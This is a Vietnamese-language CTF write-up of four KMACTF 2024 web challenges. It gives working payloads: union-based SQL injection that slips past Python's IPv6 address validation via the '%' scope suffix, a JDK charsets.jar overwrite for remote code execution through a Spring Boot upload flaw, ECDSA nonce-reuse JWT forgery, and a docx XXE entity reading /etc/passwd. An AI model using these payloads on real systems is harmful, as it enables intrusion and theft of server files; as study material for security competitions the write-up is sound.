---
title: KMACTF 2024 write up
tags: [CTF]
slug: kma-ctf-2024
date: 2024-08-25 17:59:27+0000

---

## pickleball
<br>![image](https://hackmd.io/_uploads/rynYQTui0.png)<br>
- URL: [157.15.86.73:8888](http://157.15.86.73:8888)

Challenge chia flag thành 3 phần và giấu chúng vào trang web, mình dirsearch và tìm kiếm trong request burp 1 lúc thì tìm được:
Part 1 nằm ở /robots.txt
<br>![image](https://hackmd.io/_uploads/SyXuk5OoA.png)<br>
Part 2 nằm tại file js 
<br>![image](https://hackmd.io/_uploads/r1KYy9_sC.png)<br>
Part 3 ở file css
<br>![image](https://hackmd.io/_uploads/S1yi15OiA.png)<br>
- Flag: **KMACTF{p1Ckleb4ll_WitH-uU_piCklepal_5a6b89113abb}**

## malicip
### Preface
<br>![image](https://hackmd.io/_uploads/rJ94UpdsC.png)<br>
- URL: [157.15.86.73:18000](http://157.15.86.73:18000)
### Source Code
Tại schema.sql mình thấy flag được đưa vào bảng giấu tên REDACTED_TABLE và cột giấu tên REDACTED_COLUMN, gợi ý để solve challenge cần dump database:
```sql!
CREATE TABLE `REDACTED_TABLE` (
  `REDACTED_COLUMN` varchar(128) NOT NULL
);

INSERT INTO `REDACTED_TABLE` (`REDACTED_COLUMN`)
VALUES ('KMA{redacted, of course}');
```

Ngoài file app.py xử lý 3 route của trang web, file config không có cấu hình gì đặc biệt nên mình tập trung đi vào đọc file app.py. Điều đặc biệt đập vào mắt mình là route `check-ip` được truyền vào tham số URL ip dính SQL Injection:
```python!
@app.get("/check-ip")
def check_ip():
    ip = request.args.get('ip', None, ip_address)
    if ip is not None:
        result = query_db(f"SELECT ip, message FROM malicious_ip WHERE ip = '{ip}'")
        return jsonify(
            [{"ip": ip, "message": message} for ip, message in result]
        )
    else:
        return "invalid IP, now your IP seems suspicious", 400
```
- Tham số `ip` nếu không được truyền vào sẽ mặc định là null, còn không thì được đưa vào hàm ipaddress.ip_address() để validate xem đây có phải là một IP hợp lệ hay không.
- Nếu `ip` thỏa mãn sau khi hàm check ip_address thì sẽ được đưa vào câu lệnh SQL dính SQLi, còn không trả về status 400

Mục đích của challenge đã khá rõ ràng, việc mình cần làm là truyền vào IP thỏa mãn hàm ipaddress.ip_address(), đồng thời vẫn phải exploit SQL Injection.
Điều này không dễ tí nào khi hàm này check khá chặt, thêm 1 dấu nháy hàm sẽ trả về exception ngay:
<br>![image](https://hackmd.io/_uploads/H1D3c6uj0.png)<br>
Mình mất kha khá thời gian cho việc chèn vào được một địa chỉ IP hợp lệ mà chứa được cả dấu nháy đơn. Đi tìm kiếm các vuln của thư viện nhưng cũng không có gì sử dụng được cả
Đọc lại source code, tự nhiên mình thấy địa chỉ IPv6 được insert hàng cuối khá thú vị, vì nó vẫn có thể chứa các ký tự, mình tiếp fuzzing tiếp một số địa chỉ IPv6 như `abcd::dead:beef:abcd`, nhưng vẫn chưa thể chèn được dấu nháy vào vì chỉ có thể chèn vào các ký tự biểu diễn hex mà thôi
```sql!
INSERT INTO `malicious_ip` (`ip`,`message`)
VALUES
('13.37.13.37', 'too leet'),
('103.12.104.72', 'phishing'),
('42.112.213.88', 'phishing'),
('2405:f980::1:12', 'phishing'),
('103.12.104.29', 'command & control server'),
('1337::dead:beef', 'dead leet');
```
Lượn lờ các doc thì mình thấy có phần so sánh tại [đây](https://blog.51cto.com/u_16099261/8620358) khá thú vị khi có thể chèn giá trị đằng sau địa chỉ IPv6 bằng dấu `%`
<br>![image](https://hackmd.io/_uploads/HJMMe0dj0.png)<br>
Không hiểu lắm nó có tác dụng gì, mình thử chèn nhiều hơn là số 1 vào đằng sau dấu `%` thì thấy hoàn toàn valid, mình có thể truyền vào gần như bất cứ thứ gì, trong đó có cả dấu nháy:
<br>![image](https://hackmd.io/_uploads/rkO2eRuj0.png)<br>
Lý do cho việc này thì ta cần phải đi đoạn code xử lý hàm `ipaddress.ip_address()`, hàm xét 2 trường hợp địa chỉ IP truyền vào hoặc là IPv4 hay IPv6. Sau đó tiến hành check bằng việc gán địa chỉ đó vào 2 class, việc kiểm tra sẽ được tiếp tục diễn ra tại phương thức `__init__` của 2 class đó:
```python!
def ip_address(address):
    try:
        return IPv4Address(address)
    except (AddressValueError, NetmaskValueError):
        pass

    try:
        return IPv6Address(address)
    except (AddressValueError, NetmaskValueError):
        pass

    raise ValueError(f'{address!r} does not appear to be an IPv4 or IPv6 address')
```
- Đi hàm method `__init__` của class IPv6Address, ta sẽ thấy địa chỉ IP được kiểm tra xem được truyền vào theo kiểu số nguyên, hay kiểu hỗn hợp, và cuối cùng là kiểu chuỗi -> kiểu mà ta truyền vào:
```python!
def __init__(self, address):
    # Efficient constructor from integer.
    if isinstance(address, int):
        self._check_int_address(address)
        self._ip = address
        self._scope_id = None
        return

    # Constructing from a packed address
    if isinstance(address, bytes):
        self._check_packed_address(address, 16)
        self._ip = int.from_bytes(address, 'big')
        self._scope_id = None
        return

    # Assume input argument to be string or any object representation
    # which converts into a formatted IP string.
    addr_str = str(address)
    if '/' in addr_str:
        raise AddressValueError(f"Unexpected '/' in {address!r}")
    addr_str, self._scope_id = self._split_scope_id(addr_str)

    self._ip = self._ip_int_from_string(addr_str)
```
- Tiếp tục đi vào hàm `_split_scope_id`, ta sẽ thấy địa chỉ IPv6 được chia thành 3 phần thông qua method partition('%')
    + `addr` là phần đằng trước dấu %
    + `sep` là dấu %
    + `scope_id` là phần đằng sau dấu %
- Nếu như `sep` (hay dấu `%`) không tồn tại, mặc định phần đằng sau cũng không tồn tại, hay `scope_id` là None. Còn nếu như không tồn tại `scope_id` mà lại xuất hiện dấu `%` thì quá trình parse sẽ dính lỗi mà raise exception
- Nếu vừa có sep, vừa có `scope_id` thì return 2 giá trị addr -> địa chỉ IPv6 và `scope_id` 
-> phần đằng sau dấu `%`
```python!
@staticmethod
def _split_scope_id(ip_str):
    addr, sep, scope_id = ip_str.partition('%')
    if not sep:
        scope_id = None
    elif not scope_id or '%' in scope_id:
        raise AddressValueError('Invalid IPv6 address: "%r"' % ip_str)
    return addr, scope_id
```
- Ví dụ:
<br>![image](https://hackmd.io/_uploads/HyDpzAujC.png)<br>
- Sau đó addr là giá trị `addr_str`, được đưa vào hàm `_ip_int_from_string` để đưa về dạng địa chỉ, sau đó gán vào thuộc tính `_ip` của object hiện tại. Còn `_scope_id` tạm thời không được sử dụng tiếp trong method `__init__`

Như vậy về cơ bản thì mình có thể bypass hàm check `ipaddress.ip_address()` bằng dấu `%` đằng sau 1 địa chỉ IPv6 valid:
<br>![image](https://hackmd.io/_uploads/SyJD40OiA.png)<br>
<br>![image](https://hackmd.io/_uploads/HJ1OEC_oC.png)<br>
### Exploit
Việc khó đã làm được, giờ mình chỉ cần exploit SQLi để dump db là sol được challenge rồi.
Lợi dụng việc route hiển thị tất cả các row của câu lệnh select thông qua vòng for, mình dùng union based để lấy thông tin luôn:
Tại local thì có select thẳng luôn vì mình đã biết tên bảng tên cột chứa flag:
<br>![image](https://hackmd.io/_uploads/H1bmBCOjA.png)<br>
Còn lên server thì mình sẽ lấy thông tin về tên bảng trước bằng tên db `malicip`:
```!
1337::dead:beef%' union select null,table_name from information_schema.tables where table_schema="malicip"-- -
```
<br>![image](https://hackmd.io/_uploads/H1H2HA_i0.png)<br>
Được tên bảng là `______________________________________________m4LiC10u5_T413Le`, mình tiếp tục lấy cột và lấy flag:
```!
1337::dead:beef%' union select null,column_name from information_schema.columns where table_name="______________________________________________m4LiC10u5_T413Le"-- -
```
<br>![image](https://hackmd.io/_uploads/Byr-LCOoR.png)<br>
```!
1337::dead:beef%' union select null,_____________________________________________MaL1ci0uS_c0lUmnN from ______________________________________________m4LiC10u5_T413Le-- -
```
<br>![image](https://hackmd.io/_uploads/BygEUCOo0.png)<br>
- Flag: **KMACTF{actually__this_flag-is_not_so_malicious_but_the_ipv6_is}**

## spring up
### Preface
<br>![image](https://hackmd.io/_uploads/HJasIAuiR.png)<br>
Đây là một challenge Java Spring boot mà động đến kiến thức mà mình chưa từng tìm hiểu, cho nên quá trình searching để tìm ra đúng lỗ hổng là rất lâu, sau đó mình cũng ngốn tiếp hơn 2 tiếng để build file exploit nên mình solve challenge này khi cuộc thi chỉ còn 1 tiếng, ngần đấy không đủ thời gian để tìm ra hướng cho bài web cuối cùng.
### Source Code
Đầu tiên xem xét Dockerfile, ta thấy flag được move với ký hiệu ngẫu nhiên, gợi ý cho việc để solve challenge ta cần phải RCE:
```dockerfile!
COPY flag.txt /flag.txt
RUN mv /flag.txt /flag_$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).txt
```
Tiếp tục đến docker compose, service spring boot đứng sau 1 con reversed proxy nginx, với việc service backend phía sau để no-internet khẳng định không có outbound ra ngoài, loại bỏ trường hợp sử dụng curl/wget hay reverse shell khi RCE:
```dockerfile!
version: '3'

services:
  spring_up:
    container_name: spring_up
    build: build
    restart: always
    networks:
      - no-internet

  nginx:
    image: nginx:1.27.0-alpine
    restart: unless-stopped
    ports:
      - "8080:80"
    volumes:
      - ./build/nginx.conf:/etc/nginx/conf.d/default.conf
    depends_on:
      - spring_up
    networks:
      - internet
      - no-internet

networks:
  internet: {}
  no-internet:
    internal: true
```
FIle pom và config cũng không có gì đặc biệt nên mình chuyển qua đọc web service controller luôn.
Website chủ yếu phục vụ 3 route chính, và được code bên trong class FileController, chúng đều được bắt đầu bằng prefix path: `/file/`
Route `/file/testUI` khi GET đến sẽ render file upload.html hiển thị form upload file:
```java!
@GetMapping({"testUI"})
public String testUI() {
    return "upload";
}
```
Form sẽ gửi một POST request đến route `/file/uploadResource`, tại đây file được xử lý và black list chặn một số prefix file nhất định:
```java!
private static final String[] BLACK_LIST = new String[]{"etc", "cron", "bash", "sh", "var", "proc"};

@PostMapping({"uploadResource"})
public ResponseEntity<String> uploadFile(@RequestParam("file") MultipartFile file) {
    if (file.isEmpty()) {
        return ResponseEntity.badRequest().body("Please select a file to upload.");
    } else {
        try {
            File theDir = new File("uploads/");
            if (!theDir.exists()) {
                theDir.mkdirs();
            }

            byte[] bytes = file.getBytes();
            String originalFilename = file.getOriginalFilename();

            for(int i = 0; i < BLACK_LIST.length; ++i) {
                if (originalFilename.contains(BLACK_LIST[i])) {
                    return ResponseEntity.badRequest().body("Blacklist!!");
                }
            }

            Path path = Paths.get("uploads/" + file.getOriginalFilename());
            Files.write(path, bytes, new OpenOption[0]);
            return ResponseEntity.ok("File uploaded successfully: " + path);
        } catch (IOException var6) {
            var6.printStackTrace();
            return ResponseEntity.status(500).body("Failed to upload file.");
        }
    }
}
```
Flow code của route này như sau:
- Khởi tạo thư mục uploads nếu chưa tồn tại
- Lấy nội dung của file qua method `MultipartFile.getBytes()`, đồng thời là filename bằng method `MultipartFile.getOriginalFilename()` -> method này sẽ lấy toàn bộ tên file, bao gồm cả path nên tại đây ta xác định lỗ hổng upload file + path traversal
- Trước khi lưu file sẽ được kiểm tra xem có chứa các ký tự blacklist không, nếu có thì sẽ cook luông
- Sau đó file được lưu tại thư mục uploads, đồng thời thông báo path ra ngoài cho người dùng

Ngoài ra còn có route `/file/downloadResource` dùng để download file từ thư mục uploads:
```java!
@GetMapping({"downloadResource"})
public ResponseEntity<String> downloadResource(@RequestParam String fileName) {
    String content;
    try {
        byte[] bytes = Files.readAllBytes(Paths.get("uploads/" + fileName));
        content = new String(bytes);
    } catch (Exception var5) {
        return ResponseEntity.status(HttpStatus.NOT_FOUND).body((Object)null);
    }

    MediaType mediaType = MediaType.parseMediaType("application/octet-stream");
    HttpHeaders headers = new HttpHeaders();
    headers.setContentType(mediaType);
    headers.setContentDispositionFormData("attachment", fileName);
    return ((ResponseEntity.BodyBuilder)ResponseEntity.status(HttpStatus.OK).headers(headers)).body(content);
}
```
- Về cơ bản thì chức này đọc file từ path upload nối chuỗi với request param `fileName`, từ đó expose lỗ hổng read file + path traversal

Chương trình chỉ có 2 route này là đáng chú ý, vì user chạy web service là root nên tổng hợp lại mình đang có: 
- Upload file tùy ý
- Read file tùy ý

Tưởng ngon ăn nhưng lại không hề ngon, ta không thể upload web shell jsp vì Spring Boot không code để phục vụ việc hiển thị thư mục uploads ra web, mà chỉ có thể truy cập đến thông qua route `/file/downloadResource`
<br>![image](https://hackmd.io/_uploads/BJTRQUtiC.png)<br>
<br>![image](https://hackmd.io/_uploads/HyK1EIYjA.png)<br>
Từ đó, mình đã thử kha khá cách, một số có thể nói đến là:
- Upload các file có khả năng tự động thực thi như crontab, nhưng bị blacklist -> failed
- Upload ghi đè html để trigger thymeleaf (maybe), nhưng chương trình được đóng gói thành file jar -> failed

Searching tài liệu Trung Hoa về Spring boot upload file to RCE thì mình tìm được lỗ hổng Spring boot Fat Jar tại [csdn](https://download.csdn.net/download/weixin_42131316/16637359?ydreferer=aHR0cHM6Ly93d3cuYmFpZHUuY29tL2xpbms%2FdXJsPU1VOTZSR2sycjdmak11V0RiZkNRbWlSVG1zb2RPUzYtSmJyV1pPUEZGV0V2NFhhbXJPMWlmc1pfNUlFX2o4OUROLWxxcE81Xzc4c2tTR0tHWkw3WXpCZDcxaGY1R3d3OURZejVlYW9tR0l1JndkPSZlcWlkPTk2N2Y0ZGM1MDAzOThjZDkwMDAwMDAwNjY2Y2FjZGM4), từ đó dẫn tới blog https://landgrey.me/blog/22/, đã nói chi tiết về quá trình tìm và khai thác lỗ hổng, kèm lab đi kèm + file jar ghi đè.
Về cơ bản thì lỗ hổng này cho phép ta đưa từ ghi file bất kỳ lên RCE thông qua việc ghi đè các file jar có trong lib của JDK, tác giả lựa chọn file charsets.jar vì nó có thể trigger thông qua header Accept tại HTTP Request bất kỳ
Điều kiện để khai thác lỗ hổng là:
- Biết được tên thư mục lib của JDK, với phiên bản được docker cài đặt là `openjdk:8-jdk-alpine` thì nó sẽ nằm tại: `/usr/lib/jvm/java-1.8-openjdk/jre/lib/`
- File jar đó chưa được server load để sử dụng, vậy nên đây là trò chơi 1 lần, một khi đã upload thì nếu ta exploit không thành công sẽ cần phải attack vào lib khác, hoặc đơn giản hơn là deploy lại ¯\\_(ツ)_/¯ (chắc đây cũng là lý do challenge này được deploy instance)

Cụ thể về file jar cũng như các tấn công thì nằm tại: https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/. Mình git clone về để lấy file jar của họ test thử cũng như tự build thành 1 project.
File jar của họ được build từ 2 file java class `ExtendedCharsets` dùng để khai báo các kiểu charset, còn `IBM33722` dùng để xử lý với các kiểu charset đó.
Tại `IBM33722.class` ta sẽ thấy khi kiểu charset nào được kích hoạt ở bên `ExtendedCharsets` đều sẽ thực thi ở file này, và khi khởi tạo constructor của class `IBM33722` sẽ trigger method **fun()** thực thi câu lệnh. Đây là câu lệnh được thực thi bên trong file jar mẫu của họ:
```java!
private static HashMap<String, String> fun() {
    String var1 = UUID.randomUUID().toString().replace("-", "").substring(1, 9);
    String var2 = System.getProperty("os.name");
    String[] var0;
    if (var2.startsWith("Mac OS")) {
        var0 = new String[]{"/bin/bash", "-c", "open -a Calculator"};
    } else if (var2.startsWith("Windows")) {
        var0 = new String[]{"cmd.exe", "/c", "calc"};
    } else if ((new File("/bin/bash")).exists()) {
        var0 = new String[]{"/bin/bash", "-c", "touch /tmp/charsets_test_" + var1 + ".log"};
    } else {
        var0 = new String[]{"/bin/sh", "-c", "touch /tmp/charsets_test_" + var1 + ".log"};
    }

    try {
        Runtime.getRuntime().exec(var0);
    } catch (Throwable var4) {
        var4.printStackTrace();
    }

    return null;
}
```
Upload file jar ghi đè file jar hiện tại:
<br>![image](https://hackmd.io/_uploads/HJuj_IYoA.png)<br>
<br>![image](https://hackmd.io/_uploads/HyFaOLKiC.png)<br>
Trigger bằng request kèm header: `Accept: text/html;charset=GBK`
<br>![image](https://hackmd.io/_uploads/Hk-8KIFj0.png)<br>
Kiểm tra tại docker thì ta thấy 2 file log đã được khởi tạo, chứng tỏ ta đã RCE thành công:
<br>![image](https://hackmd.io/_uploads/S1xp3Y8Fi0.png)<br>
### Exploit
Giờ công việc của mình là tự build lại 1 file jar để thay vì tạo file tmp mình sẽ ghi flag vào /tmp/flag.txt và rồi dùng route downloadResource để đọc flag
Vì chưa build file jar từ artifacts bao giờ mà mình hay dùng maven để package nên mình tốn rất nhiều thời gian cho việc này (cụ thể là 2 tiếng rưỡi)
Có một số vấn đề gặp phải mà mình lưu ý:
- Không thể nhét file .java vào file jar vì ta cần là file java được compile thành file class
- Source code gen file jar của họ không có main method, nên để chạy được ta cần thêm method main vào
- Và cũng đừng có đi sửa source của hộ, tự build lại từ source đó nhanh hơn nhiều =))

Bắt đầu từ việc khởi tạo project mới, mình để tên là charsets luôn cho tiện, đồng thời dùng jdk 1.8
<br>![image](https://hackmd.io/_uploads/BkeesUtiA.png)<br>
Tại thư mục java mình chọn new package, và nhập vào package như của author là `sun.nio.cs.ext`:
<br>![image](https://hackmd.io/_uploads/BJUQsUFi0.png)<br>
Tạo 2 file Java clss bên trong package vừa tạo và copy code vô :))), riêng tại IBM33722.java thì mình sẽ sửa câu lệnh tạo file log, đồng thời thêm main method vào (không có gì không sao):
<br>![image](https://hackmd.io/_uploads/r1AQn8KoC.png)<br>
Thêm folder META-INF và file `MANIFEST.MF` vào bên trong thư mục resource, copy nội dung của file jar kia vào:
<br>![image](https://hackmd.io/_uploads/ry5O2UYj0.png)<br>
Tiến hành compile project này bằng cách chạy nó thôi, kết quả file class sẽ nằm tại folder target:
<br>![image](https://hackmd.io/_uploads/H10C2IFiR.png)<br>
Tiến hành đóng gói thành file JAR tại tab Project Structure, chọn mục Artifacts và chọn tạo file JAR:
<br>![image](https://hackmd.io/_uploads/BJXf6UYsA.png)<br>
Tại đây thì mình không chọn gì, vì main method có cũng không quan trọng lắm:
<br>![image](https://hackmd.io/_uploads/B1pmaLtjR.png)<br>
Lúc này file charsets.jar sẽ chứa kết quả output của compile, để chắc chắn thì mình thêm nội dung bên trong folder resource là folder META-INF để chắc cú:
<br>![image](https://hackmd.io/_uploads/rkT_TLFsA.png)<br>
Tại tab Build chọn Build Artifacts, file jar sẽ được compile
<br>![image](https://hackmd.io/_uploads/rJWjaUtsA.png)<br>
Kiểm tra file jar khởi tạo thì nó đã đầy đủ các thành phần như của file jar mẫu: thư mục chứa MANIFEST và 2 file class
<br>![image](https://hackmd.io/_uploads/ByNxR8KsR.png)<br>
Nếu như nhét file java vào file jar thì file jar sẽ nặng khoảng 5KB, còn khi compile xong thì nó sẽ là 11KB
Mình deploy lại local để upload file jar mới, sau khi lặp lại các bước trên thì file flag.txt đã được khởi tạo tại /tmp/flag.txt
<br>![image](https://hackmd.io/_uploads/SJ6_C8KiC.png)<br>
Kết quả trên instance challenge:
<br>![image](https://hackmd.io/_uploads/HJgTkvYjC.png)<br>
- Flag: **KMACTF{ayoooo00oo0ooo0o0o00o0ooooo000oo0oo0o00000}**

## not so secure
<br>![image](https://hackmd.io/_uploads/Bk8JWDFsR.png)<br>
- URL: [157.15.86.73:9999](http://157.15.86.73:9999/)

Đây là challenge mà mình không kịp làm trong 1 tiếng cuối trước khi cuộc thi kết thúc, nên mình có đi hỏi về hướng làm, từ đó reproduce lại để hiểu hơn
### Bypass JWT ES256
Khi truy cập vào website, ta sẽ được ghi hero name và quirk code:
<br>![image](https://hackmd.io/_uploads/B1k1u3YjA.png)<br>
Giá trị username được ghi vào trong jwt, còn quirk code thì điền bao nhiều thì quirk vẫn có giá trị là civilian thôi.
Website thì có file robots.txt có một chút gợi ý về việc mã hóa ES256 diễn ra như thế nào:
<br>![image](https://hackmd.io/_uploads/S154_ntsA.png)<br>
Đi theo gợi ý, mình tìm cách crack jwt để đưa giá trị của quirk về hero nhưng không kịp.
Sau đó thì mình đã xin hint của người anh em [C4t-f4t](https://hackmd.io/@C4t-f4t) về hướng giải và nhận ra có script của 1 bài gần tương tự tại NahamCon 2021 dùng để bypass jwt sử dụng hệ mật đường cong Eliptic. Lỗ hổng xảy ra khi sử dụng thuật toán ECDSA mà không thay đổi nonce, attacker có thể crack ra được private key. Để hiểu hơn thì mình có thể tham khảo thêm tại: https://asecuritysite.com/encryption/ecd5
Với 2 mẫu thông điệp thì mình có thể crack được secret key và forge ra được token của riêng mình
Link write up đó tại: https://github.com/milliesolem/writeups/blob/main/NahamCon%202021/Elliptical/solve.py
Mình chỉnh sửa 1 chút cho phù hợp với bài và chèn vào phần jwt payload
```
{"username":"kev1n","quirk":"hero"}
```
<br>![image](https://hackmd.io/_uploads/BkguF3Kj0.png)<br>
Nhưng có vẻ quirk hero là không đúng, quirk là tên gọi chung của các siêu năng lực của mấy nhân vật trong website, nên mình nảy ra ý định là thử với tất cả các quirk được giới thiệu trên trang web, bao gồm:
```
ONE FOR ALL
HALF-COLD HALF-HOT
EXPLOSION
ALL FOR ONE
DARK SHADOW
CREATION
HARDENING
ENGINE
INVISIBILITY
FROG
ANIVOICE
HACKING
```
Thử đến cái quirk cuối cùng thì mình mới thấy route dashboard có sự khác biệt, và mình cũng để ý là tác giả đã hint để thành quirk này khi trang web đề cập đến người sở hữu quirk HACKING nên liên lạc với họ:
<br>![image](https://hackmd.io/_uploads/ByJ25hts0.png)<br>
Forge một jwt mới, và giao diện lúc này đã thay đổi, cho phép ta được upload file docx:
<br>![image](https://hackmd.io/_uploads/SyGi5htiR.png)<br>
<br>![image](https://hackmd.io/_uploads/ry2p53YjC.png)<br>
### From docx to XXE
Đầu tiên mình gửi một file docx valid thì chương trình sẽ đếm số lượng word có trong doc để hiển thị ra ngoài:
<br>![image](https://hackmd.io/_uploads/HkdQn2FiA.png)<br>
Đi mò mẫm các file xml có dùng để khai thác thì em tìm được write up này: https://ctftime.org/writeup/24895, trong 1 file word sẽ tồn tại các file xml và thư mục sau:
<br>![image](https://hackmd.io/_uploads/ryDhu6KsR.png)<br>
Như vậy ta có thể thấy file word thực chất là tổng hợp của nhiều file xml, nên mình có thể chèn file xml vào trong file docx để thực thi XXE.
Trong writeup mình tham khảo thì họ sử dụng file docProps/app.xml chứa các thông số về file word, cụ thể như số dòng, số chữ, số trang,... của file docx đó để inject vào số mà website show ra -> đó là số chữ (words)
```xml!
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<Properties
	xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties"
	xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
	<Template>Normal.dotm</Template>
	<TotalTime>0</TotalTime>
	<Pages>1</Pages>
	<Words>&xxe;</Words>
	<Characters>4</Characters>
	<Application>Microsoft Office Word</Application>
	<DocSecurity>0</DocSecurity>
	<Lines>100</Lines>
	<Paragraphs>1</Paragraphs>
	<ScaleCrop>false</ScaleCrop>
	<Company>Reply</Company>
	<LinksUpToDate>false</LinksUpToDate>
	<CharactersWithSpaces>4000</CharactersWithSpaces>
	<SharedDoc>false</SharedDoc>
	<HyperlinksChanged>false</HyperlinksChanged>
	<AppVersion>16.0000</AppVersion>
</Properties>
```
Tiến hành zip file xml này vào file docx bằng command:
```bash
zip a1.docx docProps/app.xml
```
<br>![image](https://hackmd.io/_uploads/BJGwtaYoA.png)<br>
Nội dung file đã hiện ra ở website
<br>![image](https://hackmd.io/_uploads/H10YYTFiC.png)<br>
Mình sẽ đọc flag bằng `file:///flag.txt`
<br>![image](https://hackmd.io/_uploads/rkvCK6KiC.png)<br>
Upload file docx và mình đã có được flag:
<br>![image](https://hackmd.io/_uploads/H1Qb5aYj0.png)<br>
- Flag: **KMACTF{3cd54_n0nc3_r3u53_4774ck_4nd_xx3_up104d}**